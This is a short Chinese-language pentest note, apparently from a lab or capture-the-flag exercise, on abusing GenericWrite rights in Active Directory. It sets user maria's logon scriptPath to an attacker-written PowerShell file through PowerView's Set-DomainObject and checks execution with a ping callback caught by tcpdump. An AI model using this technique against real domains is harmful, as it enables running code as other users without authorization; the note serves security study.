# GenericWrite

能够以下一用户权限执行命令\
类似如此，自行修改，下一用户是maria

```clike
1. 导入模块
Import-Module .\PowerView.ps1
2. 本地监听验证
sudo tcpdump -ni tun0 icmp
3. 写入
echo "ping 10.10.14.12" > ping.ps1
4. 执行
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\ping.ps1"}
接下来如果要执行命令只需要写入同一ps1即可
```

‍
